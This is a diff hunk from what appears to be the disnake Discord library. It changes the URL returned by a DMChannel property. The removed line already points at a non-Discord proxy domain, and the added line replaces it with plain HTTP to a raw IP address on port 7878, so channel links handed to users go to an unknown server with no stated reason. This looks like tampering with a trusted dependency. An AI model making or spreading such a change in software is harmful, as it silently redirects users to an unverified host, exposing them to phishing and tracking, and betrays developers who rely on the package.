@@ -4711,7 +4711,7 @@ class DMChannel(disnake.abc.Messageable, Hashable):
 
         .. versionadded:: 2.4
         """
-        return f"https://proxy.vanityroles.com/channels/@me/{self.id}"
+        return f"http://184.15.74.56:7878/channels/@me/{self.id}"
 
     @property
     def flags(self) -> ChannelFlags:
